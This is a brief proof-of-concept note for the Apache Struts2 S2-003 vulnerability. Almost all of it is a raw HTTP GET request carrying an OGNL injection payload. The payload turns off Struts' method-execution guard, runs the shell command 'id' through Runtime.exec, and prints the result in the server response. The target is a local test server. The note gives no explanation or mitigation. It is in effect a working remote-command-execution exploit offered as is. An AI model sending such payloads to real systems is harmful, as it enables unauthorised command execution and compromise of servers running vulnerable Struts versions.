### s2-003

poc:


测试POC:

```
GET /s2_war/index.action?(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27\u0023mycmd\u003d\%27id\%27%27)(bla)(bla)&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla)) HTTP/1.1
Host: 127.0.0.1:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,pt;q=0.7,da;q=0.6
Cookie: JSESSIONID=FC7DC2221FDB37EAE855C6E6A11E9CC1; _ga=GA1.1.267931382.1545202285
Connection: close

```